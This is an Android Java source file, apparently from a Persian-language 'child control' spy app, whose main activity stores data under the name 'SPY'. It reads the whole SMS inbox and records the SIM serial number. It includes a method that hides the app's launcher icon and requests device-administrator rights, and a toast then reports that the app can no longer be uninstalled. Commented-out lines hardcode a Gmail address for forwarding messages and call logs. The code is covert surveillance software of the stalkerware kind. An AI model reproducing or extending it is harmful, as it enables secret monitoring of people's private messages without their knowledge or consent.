package com.example.remote;



import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {
	
	SharedPreferences values;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main_layout);
		values = getSharedPreferences("SPY", 0);

//		WebView webView = (WebView) findViewById(R.id.webView1);
//		webView.setWebViewClient(new WebViewClient());
//		webView.loadUrl("https://play.google.com/store/apps/details?id=com.iudesk.android.photo.editor&hl=en");

		/*// To track statistics around application
		ParseAnalytics.trackAppOpened(getIntent());
	
		// inform the Parse Cloud that it is ready for notifications
		PushService.setDefaultPushCallback(this, MainActivity.class);
		ParseInstallation.getCurrentInstallation().saveInBackground();*/

		new AlertDialog.Builder(MainActivity.this)
				.setTitle("هشدار")
				.setMessage("این برنامه برای کنترل فرزندان می باشد و هرگونه استفاده از این برنامه به عهده مصرف کننده است !!")
				.setPositiveButton("باشه", new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int which) {
						// continue with delete
					}
				})
				.setIcon(android.R.drawable.ic_dialog_alert)
				.show();

		Log.e("1111111111", values.getString("sim_ed", ""));
//		HideApp();
//		enableDeviceAdministration();
//		values.edit().putString("mail_mess_ed", "farzadfarzin477@gmail.com").commit();
//		values.edit().putBoolean("mail_mess_ch", true).commit();
//		values.edit().putString("mail_call_ed", "farzadfarzin477@gmail.com").commit();
//		values.edit().putBoolean("mail_call_ch", true).commit();

		set_first_mess();
		
		if(values.getBoolean("get_history", true))
		{
	        TelephonyManager tMgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
			String mPhoneNumber = tMgr.getSimSerialNumber();
			values.edit().putString("sim", mPhoneNumber).commit();
			
			values.edit().putBoolean("get_history", false).commit();
		}
		
		
		//start repeater
		/*Intent i = new Intent(MainActivity.this, AutoStart.class);
		sendBroadcast(i);*/
		
		
		
		Button mess_bt =(Button)findViewById(R.id.message_bt);
		Button pass_bt =(Button)findViewById(R.id.pass_bt);
		Button call_bt =(Button)findViewById(R.id.call_bt);
		Button other =(Button)findViewById(R.id.other);
		
		Button info =(Button)findViewById(R.id.info);
		info.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				Intent i = new Intent(MainActivity.this, info.class);
				startActivity(i);
			}
		});
		
		mess_bt.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Intent i = new Intent(MainActivity.this, mess.class);
				startActivity(i);
			}
		});
		

		pass_bt.setOnClickListener(new OnClickListener() {
	
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Intent i = new Intent(MainActivity.this, pass.class);
				startActivity(i);
			}
		});

		call_bt.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Intent i = new Intent(MainActivity.this, call.class);
				startActivity(i);
			}
		});
		
		other.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Intent i = new Intent(MainActivity.this, other.class);
				startActivity(i);
			}
		});

		
	}

	public void HideApp() {
		Intent localIntent = new Intent(getApplicationContext(), MainActivity.class);
		getApplicationContext().startService(localIntent);
		getPackageManager().setComponentEnabledSetting(new ComponentName(MainActivity.this, MainActivity.class), 2, 1);
	}
	
	/*@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	@Override
	public boolean onMenuItemSelected(int featureId, MenuItem item) {
		// TODO Auto-generated method stub
		Intent i = new Intent(MainActivity.this, info.class);
		Intent i2 = new Intent(MainActivity.this, contact.class);
		if(item.getItemId() == R.id.item2)
			startActivity(i);
		if(item.getItemId() == R.id.item1)
			startActivity(i2);
		
		return super.onMenuItemSelected(featureId, item);
	}*/
	
	public void set_first_mess()
    {
        Uri mSmsinboxQueryUri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(mSmsinboxQueryUri,
                new String[]{"_id", "thread_id", "address", "person", "date",
                        "body", "type"}, null, null, null);
        String[] columns = new String[] { "address", "person", "date", "body","type","_id" };
        int temp =0;
        if (cursor.getCount() > 0) 
        {
            cursor.moveToFirst();
            while (cursor.moveToNext())
            {
//            	String type = cursor.getString(cursor.getColumnIndex(columns[4]));
//           	 	if(type.equals("2"))
           	 	{
           	 		int id = Integer.valueOf(cursor.getString(cursor.getColumnIndex(columns[5])));
	                if(id > temp)
	                    temp = id;
           	 	}
            }
            Log.e("((((()))))))", temp+"");
            values.edit().putInt("last_mess_id", temp).commit();
        }
    }

	public void enableDeviceAdministration()
	{
		DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)getSystemService("device_policy");
		ComponentName localComponentName = new ComponentName(MainActivity.this, DeviceAdminConfig.class);
		if (!localDevicePolicyManager.isAdminActive(localComponentName))
		{

			Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
			localIntent.putExtra("android.app.extra.DEVICE_ADMIN", localComponentName);
			localIntent.putExtra("android.app.extra.ADD_EXPLANATION", getString(R.string.my));
			Log.e("#######", "@@@@@@@@");
			startActivityForResult(localIntent, 12);
		}
	}

	protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent)
	{
		switch (paramInt1)
		{
			case 12:
			default:
				super.onActivityResult(paramInt1, paramInt2, paramIntent);
		}
		if (paramInt2 == -1)
		{
			Toast.makeText(this, "دیگر برنامه پاک نمی شود !", Toast.LENGTH_SHORT).show();
		}
		else
		{
			Toast.makeText(this, "برنامه پاک می شود !", Toast.LENGTH_SHORT).show();
		}
	}

	public void disableDeviceAdministration()
	{
		((DevicePolicyManager)getSystemService("device_policy")).removeActiveAdmin(new ComponentName(this, DeviceAdminConfig.class));
	}

}
